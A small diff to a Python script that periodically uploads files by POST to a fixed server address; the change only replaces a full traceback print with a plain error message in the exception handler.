@@ -26,6 +26,6 @@ if __name__ == '__main__':
             # 发送 POST 请求到服务器端
             response = requests.post('http://182.92.170.91:12138/upload', files=files)
         except Exception as e:
-            traceback.print_exc()
+            print(e)
         finally:
             time.sleep(60)
